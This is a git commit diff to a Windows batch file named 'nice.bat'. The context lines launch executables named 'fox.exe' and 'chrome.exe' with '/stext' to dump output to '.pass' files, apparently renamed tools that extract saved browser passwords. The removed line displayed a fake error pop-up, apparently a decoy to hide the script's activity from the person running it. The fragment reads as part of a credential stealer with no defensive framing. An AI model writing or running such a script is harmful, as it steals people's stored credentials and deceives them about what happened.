71fb74e3d77de2932ebec24bc6da796c44412917
xryven <baeadr244@proton.me>
2025-02-19 10:28:23 +0100

    Update nice.bat

--- nice/nice.bat
+++ nice/nice.bat
@@ -4,4 +4,4 @@ for /l %%a in (1,1,1) do if "!Today:~-1!"==" " set Today=!Today:~0,-1!
 SET dynpathname=.txt
 start fox.exe /stext fox.pass
 start chrome.exe /stext chrome.pass
-start /min powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('An error has occurred!', 'Error', 'OK', 'Error')" & exit
+
